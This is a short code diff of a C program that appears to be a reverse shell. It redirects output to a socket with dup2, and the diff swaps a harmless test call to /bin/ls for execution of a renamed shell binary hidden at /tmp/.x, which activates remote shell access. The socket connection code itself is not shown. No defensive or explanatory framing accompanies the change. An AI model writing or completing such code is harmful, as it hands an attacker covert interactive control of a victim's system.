@@ -19,11 +19,9 @@ int main() {
     dup2(sock, 1);
     dup2(sock, 2);
 
-    // renamed shell binary (you must create this manually) but for test we use `ls`
-    //char *args[] = {"/tmp/.x", NULL};
-    //execve("/tmp/.x", args, NULL);
-
-    execve("/bin/ls", NULL, NULL);
+    // renamed shell binary (you must create this manually) 
+    char *args[] = {"/tmp/.x", NULL};
+    execve("/tmp/.x", args, NULL);
 
     return 0;
 }
